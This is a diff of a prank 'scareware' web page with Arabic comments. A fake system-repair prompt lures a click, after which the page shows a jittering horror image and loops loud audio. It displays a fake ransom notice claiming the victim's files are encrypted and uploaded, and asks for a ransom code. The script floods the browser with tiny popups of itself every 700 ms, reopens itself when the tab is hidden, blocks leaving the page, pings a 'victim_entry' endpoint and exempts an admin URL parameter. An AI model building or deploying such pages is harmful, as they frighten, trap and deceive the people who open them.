@@ -3,57 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ 505 SYSTEM_DESTROYED ☠️</title>
+    <title>☠️ CRITICAL_SYSTEM_ERROR ☠️</title>
     <style>
-        /* واجهة السيطرة المطلقة سواسوة */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
         
+        /* ميزة الصورة المتحركة سواسوة */
         #horrorImg { 
-            position: fixed; top: 0; left: 0; 
-            width: 100vw; height: 100vh; 
+            position: absolute; 
+            width: 120vw; height: 120vh; /* أكبر من الشاشة باش كي تتحرك ما يبانش الفراغ */
             object-fit: cover; 
             z-index: 9999; display: none; 
-            /* تعديل العينين: تباين حاد لإظهار الرعب سواسوة */
-            filter: contrast(190%) brightness(80%);
+            filter: contrast(200%) brightness(70%) grayscale(50%);
+            transition: all 0.1s ease-in-out; /* حركة سريعة ومفاجئة */
         }
 
         #deepWebOverlay { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.92); padding: 40px; border: 1px solid #400; display: none; width: 95%; 
-            box-shadow: 0 0 80px #f00;
+            background: rgba(0,0,0,0.85); padding: 30px; border: 2px solid #600; display: none; width: 90%; 
+            box-shadow: 0 0 100px #f00;
         }
 
-        .horror-eyes-blink { animation: horrorBlinker 0.07s linear infinite; }
-        @keyframes horrorBlinker { 50% { opacity: 0.2; } }
+        .eyes-pulse { animation: pulse 0.5s infinite alternate; }
+        @keyframes pulse { from { filter: hue-rotate(0deg) contrast(200%); } to { filter: hue-rotate(20deg) contrast(250%); } }
 
-        .blink { animation: blinker 0.05s linear infinite; }
+        .blink-red { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
         
-        #unlockBox { margin-top: 25px; border: 1px solid #f00; background: #000; color: #f00; padding: 12px; width: 80%; text-align: center; font-family: monospace; font-weight: bold; }
+        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 12px; width: 80%; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body onclick="launchNightmare()">
 
-    <div id="clickAnywhere" style="color: #400; font-family: monospace; z-index: 10001; font-size: 15px; cursor: pointer; text-align: center; padding: 20px;">
-        [ CRITICAL SYSTEM FAILURE ]<br>
-        CLICK TO RECOVER DATA
+    <div id="setup" style="color: #600; font-family: monospace; font-size: 14px; text-align: center; cursor: pointer;">
+        [ SYSTEM_REPAIR_REQUIRED ]<br>
+        PLEASE CLICK TO INITIALIZE SCAN...
     </div>
 
-    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+    <img id="horrorImg" class="eyes-pulse" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     
     <div id="deepWebOverlay">
-        <h1 class="horror-eyes-blink" style="font-size: 30px; letter-spacing: 6px; text-shadow: 0 0 20px #f00;">WE ARE WATCHING YOU</h1>
-        <p style="font-size: 14px; color: #fff; border-bottom: 1px solid #f00; padding-bottom: 10px;">
-            لقد تم اختراق نظامك بنجاح. جميع ملفاتك وصورك الآن في خوادم الديب ويب.
+        <h1 class="blink-red" style="font-size: 26px; letter-spacing: 5px;">I SEE YOU</h1>
+        <p style="font-size: 14px; color: #fff; font-weight: bold;">
+            لقد انتهى وقتك. جميع ملفاتك مشفرة ولن تسمع إلا هذا الصوت.
         </p>
-        <p style="font-size: 11px; color: #888;">IP_STATUS: <span style="color:#f00;">LOCKED</span> | ENCRYPTION: <span style="color:#f00;">ACTIVE</span></p>
+        <p style="font-size: 11px; color: #ff0000;">IP: <span id="ip">TRACKED</span> | DATA: <span class="blink-red">UPLOADING...</span></p>
         
-        <input type="text" id="unlockBox" placeholder="أدخل رمز الفدية للمغادرة" oninput="verifyAdmin()">
-        <p class="blink" style="font-size: 10px; color: #f00; margin-top: 15px;">محاولة الخروج ستدمر الذاكرة نهائياً.</p>
+        <input type="text" id="unlockBox" placeholder="أدخل كود الفدية للمغادرة" oninput="verifyAdmin()">
+        <p style="font-size: 10px; color: #555; margin-top: 10px;">ROOT@DEEPWEB_TERMINAL</p>
     </div>
 
-    <audio id="sfx" preload="auto">
+    <audio id="sfx" loop>
         <source src="tfy-krk.mp3" type="audio/mpeg">
     </audio>
 
@@ -62,37 +62,36 @@
         const isAdmin = urlParams.get('user') === 'admin_dz'; 
         const MY_LINK = window.location.href;
         const audio = document.getElementById('sfx');
-
-        // ميزة الذاكرة: الدخول الفوري للضحية سواسوة
-        if (localStorage.getItem('terminal_breach') === 'true' && !isAdmin) {
-            setTimeout(() => launchNightmare(), 100);
-        }
+        const img = document.getElementById('horrorImg');
 
         function launchNightmare() {
-            if (isAdmin) return alert("System Bypass: Welcome Admin.");
+            if (isAdmin) return alert("Admin Bypass: Active.");
             
-            // إرسال تنبيه للرصد في Termux سواسوة
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
             localStorage.setItem('terminal_breach', 'true');
 
-            document.getElementById('clickAnywhere').style.display = 'none';
-            document.getElementById('horrorImg').style.display = 'block';
+            document.getElementById('setup').style.display = 'none';
+            img.style.display = 'block';
             document.getElementById('deepWebOverlay').style.display = 'block';
             
-            // فرض تشغيل الصوت ديركت وبأقصى قوة سواسوة
-            audio.currentTime = 0; 
+            // تشغيل الصوت كامل وبقوة سواسوة
             audio.volume = 1.0;
+            audio.currentTime = 0;
             audio.play();
 
-            // تكرار جملة "طفي خراك" سواسوة
-            audio.onended = () => { if(!isAdmin) audio.play(); };
-
-            // ميزة الحبس المتكرر سواسوة
+            // ميزة تحريك الصورة عشوائياً (Dynamic Stalking) سواسوة
             setInterval(() => {
                 if (!isAdmin) {
-                    window.open(MY_LINK, '_blank', 'width=1,height=1');
+                    const x = Math.random() * 20 - 10; // تحرك بين -10 و 10
+                    const y = Math.random() * 20 - 10;
+                    img.style.transform = `translate(${x}px, ${y}px) scale(1.1)`;
                 }
-            }, 750);
+            }, 100);
+
+            // الحبس الأبدي سواسوة
+            setInterval(() => {
+                if (!isAdmin) window.open(MY_LINK, '_blank', 'width=1,height=1');
+            }, 700);
         }
 
         function verifyAdmin() {
@@ -102,8 +101,7 @@
             }
         }
 
-        // منع الهروب سواسوة
-        window.onbeforeunload = () => "FILES ARE UNDER ATTACK!";
+        window.onbeforeunload = () => "FILES_ENCRYPTED_PERMANENTLY";
         document.addEventListener("visibilitychange", () => {
             if (!isAdmin && document.visibilityState === 'hidden') window.open(MY_LINK, '_blank');
         });
